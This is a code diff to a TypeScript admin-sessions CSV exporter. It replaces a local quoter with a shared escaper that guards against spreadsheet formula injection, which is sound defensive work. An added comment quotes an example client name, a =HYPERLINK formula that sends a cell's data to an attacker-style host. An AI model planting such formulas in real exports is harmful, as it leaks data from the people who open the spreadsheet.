@@ -1,5 +1,6 @@
 import type { Session } from './ViewSessionModal.types';
 import type { AdminSessionsSortKey } from './AdminSessionsTablePanel';
+import { escapeCsvValue } from '@/utils/csvEscape';
 
 export type AdminSessionsSortConfig = {
   key: AdminSessionsSortKey;
@@ -171,10 +172,15 @@ export const paginateAdminSessions = (
   return { paginatedSessions, totalPages, displayStart, displayEnd };
 };
 
-const csvCell = (value: string | number | null | undefined) => {
-  const text = value == null ? 'N/A' : String(value);
-  return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
-};
+// Escaping AND formula neutralisation now come from @/utils/csvEscape. This file's
+// private quoter was a correct RFC 4180 quoter with NO formula guard, so a client
+// named `=HYPERLINK("https://evil.example?d="&A1,"View invoice")` arrived live in
+// the admin's spreadsheet. Client name and location are user-controlled and this
+// export runs in the browser, so nothing server-side ever saw them.
+//
+// The `N/A` fallback is this call site's own contract and is preserved here rather
+// than pushed into the shared escaper (which renders null/undefined as '').
+const csvCell = (value: string | number | null | undefined) => escapeCsvValue(value ?? 'N/A');
 
 export const buildAdminSessionsCsv = (
   sessions: Session[],
